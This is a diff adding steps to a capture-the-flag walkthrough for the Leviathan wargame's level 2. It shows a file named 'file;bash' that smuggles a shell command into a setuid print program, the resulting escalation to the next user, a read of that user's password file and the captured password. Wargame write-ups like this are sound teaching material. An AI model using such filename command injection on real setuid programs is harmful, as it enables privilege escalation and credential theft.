@@ -62,9 +62,19 @@ geteuid()                                                                = 12002
 geteuid()                                                                = 12002
 setreuid(12002, 12002)
 ```
-  -  So created a temporary directory `mktemp -d`. Directory : `/tmp/tmp.AluKCOAkB4`
-  -  `cd /tmp/tmp.AluKCOAkB4` : Enter the directory
-  -  
+  -  So created a temporary directory `mktemp -d`. Directory : `/tmp/tmp.xwYiWD6qKQ`
+  -  `cd /tmp/tmp.xwYiWD6qKQ` : Enter the directory
+  -  `touch 'file;bash'` this helps with command injection.
+  -  `cd` exit directiry.
+  -  `./printfile /tmp/tmp.xwYiWD6qKQ/file\;bash` : Permission is denined since we try to run the bash file but we escalte into leviathan3.
+```
+leviathan2@gibson:/tmp/tmp.xwYiWD6qKQ$ cd
+leviathan2@gibson:~$ ./printfile /tmp/tmp.xwYiWD6qKQ/file\;bash 
+/bin/cat: /tmp/tmp.xwYiWD6qKQ/file: Permission denied
+leviathan3@gibson:~$
+```
+  -  `cat /etc/leviathan_pass/leviathan3`
+  -  Password: `Q0G8j4sakn`
 
 
 
